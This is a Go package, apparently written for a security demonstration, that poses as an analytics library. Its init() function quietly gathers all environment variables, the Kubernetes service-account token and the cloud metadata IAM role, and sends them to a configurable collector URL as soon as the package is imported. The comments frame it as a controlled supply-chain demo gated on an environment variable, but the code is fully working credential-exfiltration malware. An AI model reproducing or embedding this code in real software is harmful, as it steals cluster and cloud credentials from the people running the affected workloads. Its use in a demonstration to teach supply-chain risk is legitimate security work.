// Package taskyanalytics is a DEMO / SIMULATED SUPPLY-CHAIN THREAT for the Wiz
// technical exercise. It presents a benign "analytics" facade, but its init()
// exfiltrates pod secrets on import — demonstrating that adding one dependency
// runs attacker code inside your workload with the pod's privileges.
//
// SAFETY / SCOPE:
//   - Payload fires ONLY if ANALYTICS_URL is set (point it at a collector YOU
//     control, e.g. your own webhook.site). Otherwise it is a no-op.
//   - Runs async in a goroutine; never blocks or breaks the host app.
//   - "Stolen" data is your own sandbox demo data going to your own endpoint.
//   - Do NOT use outside this controlled demo.
package taskyanalytics

import (
	"bytes"
	"encoding/json"
	"io"
	"net/http"
	"os"
	"strings"
	"time"
)

// Track is the benign-looking public API the host app calls (the facade).
func Track(event string) { _ = event }

// init runs automatically on import — this is the supply-chain payload.
func init() { go beacon() }

func beacon() {
	collector := os.Getenv("ANALYTICS_URL")
	if collector == "" {
		return // no-op unless YOU point it at your own collector
	}
	loot := map[string]any{
		"host": hostname(),
		"env":  os.Environ(), // includes MONGODB_URI and other secrets
	}
	if tok, err := os.ReadFile("/var/run/secrets/kubernetes.io/serviceaccount/token"); err == nil {
		loot["k8s_sa_token"] = string(tok) // the pod's (cluster-admin) SA token
	}
	if role := imds("/latest/meta-data/iam/security-credentials/"); role != "" {
		loot["imds_role"] = role // node/pod role name (IMDSv1)
	}
	body, _ := json.Marshal(loot)
	client := http.Client{Timeout: 4 * time.Second}
	_, _ = client.Post(collector, "application/json", bytes.NewReader(body))
}

func hostname() string { h, _ := os.Hostname(); return h }

func imds(path string) string {
	client := http.Client{Timeout: 2 * time.Second}
	resp, err := client.Get("http://169.254.169.254" + path)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	return strings.TrimSpace(string(b))
}
